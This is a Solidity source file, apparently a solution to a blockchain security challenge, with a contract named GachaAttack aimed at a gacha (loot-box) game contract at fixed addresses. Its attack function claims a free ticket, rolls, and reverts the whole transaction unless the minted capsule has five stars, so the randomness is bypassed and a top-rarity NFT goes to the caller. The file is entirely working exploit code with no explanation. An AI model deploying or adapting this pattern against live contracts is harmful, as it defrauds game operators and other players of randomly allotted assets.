// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGachaMachine {
    function checkNextFreeTicket(address _address) external view returns (uint256);
    function getFreeTicket() external;
    function roll() external;
}

interface IGachaCapsule {
    function getStars(uint256 _tokenId) external view returns (uint256); 
    function transferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external view returns (uint256);
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract GachaAttack {

    IGachaMachine public gmInstane = IGachaMachine(0x0460ccA088FfEEB4dba624112D5c1CbdF8825e34);
    IGachaCapsule public gcInstance = IGachaCapsule(0x1401B8F0316E90B0e864d7FE31c691f2153EB074);
    IERC20 public gtInstance = IERC20(0xbBcFE716824e68140757AF340F3601C3d43Be0fD);

    uint256 public ownTokenId;
    
    function attack() external {
        gmInstane.getFreeTicket();
        
        gtInstance.approve(address(gmInstane), gtInstance.balanceOf(address(this)));
        gmInstane.roll();
        ownTokenId = gcInstance.tokenOfOwnerByIndex(address(this),0);
        
        require(gcInstance.getStars(ownTokenId)==5, "Attack was not success");
        gcInstance.transferFrom(address(this), tx.origin, ownTokenId);
    }
}